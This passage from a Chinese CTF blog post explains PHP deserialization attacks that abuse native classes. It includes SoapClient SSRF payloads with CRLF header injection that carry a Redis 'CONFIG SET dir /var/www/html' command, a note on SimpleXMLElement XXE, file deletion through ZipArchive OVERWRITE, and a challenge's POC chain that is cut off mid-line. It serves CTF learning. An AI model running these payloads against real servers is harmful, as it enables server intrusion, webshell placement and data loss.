<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
<p>虽然最后也是String字符，但是我实验下没有成功。</p>
<p>我也想到一个payload,然后1来传参，但是也没成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$str=&quot;?&gt;&quot;&lt;?=include$_GET[1];?&gt;&quot;</span><br></pre></td></tr></table></figure>
<h4 id="soapclient类来进行ssrf"><a class="markdownIt-Anchor" href="#soapclient类来进行ssrf"></a> SoapClient类来进行SSRF</h4>
<h5 id="soapclient类"><a class="markdownIt-Anchor" href="#soapclient类"></a> SoapClient类</h5>
<p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SoapClient &#123; </span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而<code>__call</code>触发很简单，就是当对象访问不存在的方法的时候就会触发。</p>
<p>该类的构造函数如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br><span class="line">- 第一个参数是用来指明是否是wsdl模式，将该值设为<span class="literal">null</span>则表示非wsdl模式。</span><br><span class="line">- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间</span><br></pre></td></tr></table></figure>
<p>直接利用SoapClient来进行SSRF</p>
<p>构造php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000/aaa&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>记得监听自己VPN上的端口<br>
<img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16-16672739578745.png" alt="请添加图片描述"></p>
<p>但是当存在CRLF漏洞，我们就可以通过<code>user_agent</code>的参数伪造http头</p>
<p>运行后，监听界面就出现了伪造的http头</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/f470fdddc476471d85f438538e078165-16672739578746.png" alt="请添加图片描述"><br>
这儿可以看看怎么利用伪造http头去构造redis命令</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://ip:10000/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^hello&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/0bd047f6a1934f67ba766f9caead2a7e-16672739578747.png" alt="在这里插入图片描述"><br>
伪造了redis命令，这样我们就可以用http协议去打redis了。</p>
<p>对于发送POST数据包，Content-Type 的值我们要设置为 application/x-www-form-urlencoded，而且Content-Length的值需要与post的数据长度一致。而且http头跟post数据中间间隔<code>\r\n\r\n</code>,其他间隔<code>\r\n</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://ip:10000/&#x27;</span>;</span><br><span class="line"><span class="variable">$post_data</span> = <span class="string">&#x27;data=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_data</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>成功发送post数据包<br>
<img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_19,color_FFFFFF,t_70,g_se,x_16-16672739578748.png" alt="在这里插入图片描述"></p>
<p><strong>bestphp’s revenge</strong></p>
<p>也可以看看<a href="https://blog.csdn.net/unexpectedthing/article/details/121319348">ctfshow的web259</a></p>
<p>看看<a href="https://blog.csdn.net/rfrder/article/details/114445325">feng师傅的wp</a></p>
<h4 id="使用-simplexmlelement-类进行-xxe"><a class="markdownIt-Anchor" href="#使用-simplexmlelement-类进行-xxe"></a> 使用 SimpleXMLElement 类进行 XXE</h4>
<h5 id="simplexmlelement类"><a class="markdownIt-Anchor" href="#simplexmlelement类"></a> SimpleXMLElement类</h5>
<p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
<p>官方文档中对SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下:</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9c463254527f22878a51271db820c6a4-16672739578749.png" alt="image-20210118131857853"></p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/87f41bb0c1b7c7ff829dcbf4e1bdd035-166727395787410.png" alt="image-20210118131957770"></p>
<p>意味着，当我们将第三个参数<code>data_is_url</code>设置为true的话，我们就可以调用远程xml文件，实现xxe的攻击。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<h5 id="suctf2018-homework"><a class="markdownIt-Anchor" href="#suctf2018-homework"></a> SUCTF2018-Homework</h5>
<p>可以看看<a href="https://johnfrod.top/ctf/suctf-2018homework/">这个的wp</a></p>
<h4 id="使用-ziparchive-类来删除文件"><a class="markdownIt-Anchor" href="#使用-ziparchive-类来删除文件"></a> 使用 ZipArchive 类来删除文件</h4>
<p>ZipArchive类可以对文件进行压缩与解压缩处理。</p>
<p>条件：php 5.20</p>
<p>常见的类方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addEmptyDir</span>：添加一个新的文件目录</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addFile</span>：将文件添加到指定zip压缩包中</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">addFromString</span>：添加新的文件同时将内容添加进去</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">close</span>：关闭ziparchive</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">extractTo</span>：将压缩包解压</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">open</span>：打开一个zip压缩包</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">deleteIndex</span>：删除压缩包中的某一个文件，如：<span class="title function_ invoke__">deleteIndex</span>(<span class="number">0</span>)代表删除第一个文件</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">deleteName</span>：删除压缩包中的某一个文件名称，同时也将文件删除</span><br></pre></td></tr></table></figure>
<p>我们看看<code>ZipArchive::open</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">int</span> <span class="variable">$flags</span>=<span class="number">0</span>)</span><br><span class="line">该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</span><br><span class="line"></span><br><span class="line">filename：要打开的ZIP存档的文件名。</span><br><span class="line">flags：用于打开档案的模式。有以下几种模式：</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>：如果不存在则创建一个zip压缩包。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">RDONLY</span>：只读模式打开压缩包。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">EXCL</span>：如果压缩包已经存在，则出错。</span><br><span class="line"><span class="title class_">ZipArchive</span>::<span class="variable constant_">CHECKCONS</span>：对压缩包执行额外的一致性检查，如果失败则显示错误。</span><br><span class="line">注意，如果设置flags参数的值为 <span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span> 的话，可以把指定文件删除。这里我们跟进方法可以看到<span class="keyword">const</span> <span class="variable constant_">OVERWRITE</span> = <span class="number">8</span>，也就是将OVERWRITE定义为了常量<span class="number">8</span>，我们在调用时也可以直接将flags赋值为<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>也就是说我们可以通过ZipArchive直接调用open方法删除目标机上的文件</p>
<h5 id="梦里花开牡丹亭"><a class="markdownIt-Anchor" href="#梦里花开牡丹亭"></a> 梦里花开牡丹亭</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 当waf.txt没读取成功时才能得到flag</span></span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这串代码就是一个简单的反序列化POC</p>
<p>首先我们需要利用<code>file_get_contents</code>来得到文件内容</p>
<p>我们先让<code>register</code>的值为admin，进入<code>$this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content)</code>，进入login类后，我们需要让<code>username</code>=admin,<code>password</code>=admin，进入<code>$this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content)</code>，一如既往的，我们让<code>file</code>的值为<code>open</code>，那么我们就可以调用open类的open方法，达到我们的目的。</p>
<p>构造poc(其他师傅的)</p>
<p>因为前面包含<code>shell.php</code>，首先读取shell.php的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=shell&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ 